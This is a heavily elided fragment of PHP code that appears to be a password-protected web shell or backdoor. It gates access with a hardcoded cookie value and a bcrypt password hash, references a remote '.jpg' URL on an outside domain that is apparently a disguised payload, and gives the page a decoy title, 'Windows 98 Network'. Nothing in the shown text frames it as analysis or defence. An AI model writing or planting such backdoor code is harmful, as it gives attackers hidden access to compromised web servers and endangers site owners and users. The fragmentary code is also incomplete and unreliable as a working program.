...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'BIJIKUDA'; 
}
...
if (is_logged_in()) {
    ...
    $destiny = 'https://belajarbacatulis.xyz/papatampan.jpg';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$4MCtAit3MAox/x2SB/MOEu2CULbNGfQjqOtQg/Jl7LU4uhSF1YigW'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'BIJIKUDA', time() + 3600, '/'); 
...
<head>
    <meta charset="UTF-8">
    <title>Windows 98 Network</title>
